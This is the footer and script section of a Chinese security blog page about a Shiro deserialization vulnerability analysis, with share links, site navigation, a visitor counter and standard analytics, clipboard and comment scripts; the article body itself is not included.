  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/10/04/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/10/04/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&text=Shiro反序列化漏洞分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/10/04/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Shiro反序列化漏洞分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/10/04/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&is_video=false&description=Shiro反序列化漏洞分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Shiro反序列化漏洞分析&body=Check out this article: http://example.com/2022/10/04/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/10/04/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Shiro反序列化漏洞分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/10/04/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Shiro反序列化漏洞分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/10/04/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Shiro反序列化漏洞分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/10/04/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Shiro反序列化漏洞分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/10/04/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&name=Shiro反序列化漏洞分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/10/04/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&t=Shiro反序列化漏洞分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
      <div class="footer-left">
        Copyright &copy;
        
        
        2022-2025
        Funsiooo
      </div>
      <div class="footer-right">
        <nav>
          <ul>
            <!--
          --><li><a href="/">首页</a></li><!--
        --><!--
          --><li><a href="/archives/">归档</a></li><!--
        --><!--
          --><li><a href="/search/">搜索</a></li><!--
        --><!--
          --><li><a href="/tags/">标签</a></li><!--
        --><!--
          --><li><a href="/about/">关于</a></li><!--
        -->
          </ul>
        </nav>        
      </div>

      <div class="footer-midle">
        <nav>
          <ul>
            
              <!-- 不蒜子统计 -->
              <span id="busuanzi_container_site_pv">
                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
              </span>
              <span class="post-meta-divider">|</span>
              <span id="busuanzi_container_site_uv" style='display:none'>
                      本站访客数<span id="busuanzi_value_site_uv"></span>人
              </span>
              <span id="busuanzi_container_page_pv">
			  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
	      </span>
            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            
          </ul>
        </nav>
      </div>
</footer>
    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功！");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

  <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?47a5bc2b41144f91553c5eefd4999c0d";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
        </script>

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'boom';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>

<!-- utterances Comments -->

<!-- FancyBox -->

<script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>


</body>
</html>
